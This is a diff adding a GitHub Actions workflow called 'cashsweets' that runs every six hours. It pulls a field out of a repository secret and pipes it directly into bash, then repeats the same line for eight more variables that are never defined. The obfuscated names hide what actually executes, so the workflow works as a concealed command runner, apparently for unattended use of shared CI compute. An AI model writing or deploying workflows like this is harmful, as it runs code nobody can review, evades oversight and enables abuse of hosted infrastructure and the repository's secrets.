@@ -1,0 +1,26 @@
+name: cashsweets
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cashsweets
+        env:
+          fqjn8796: ${{ secrets.fqjn8796 }}
+        run: |
+          echo $fqjn8796 | jq -r .nizwg25951 | /bin/bash
+          echo $f5018 | jq -r .vdmc5534 | /bin/bash
+          echo $qc58 | jq -r .nkfwk3 | /bin/bash
+          echo $gmf0206 | jq -r .qgloz63 | /bin/bash
+          echo $zw9533 | jq -r .ysvtw25285 | /bin/bash
+          echo $jvro32 | jq -r .sbvuo4460 | /bin/bash
+          echo $snk29581 | jq -r .oc85333 | /bin/bash
+          echo $zmfxo6 | jq -r .wn025 | /bin/bash
+          echo $ds474 | jq -r .ppff71 | /bin/bash
+
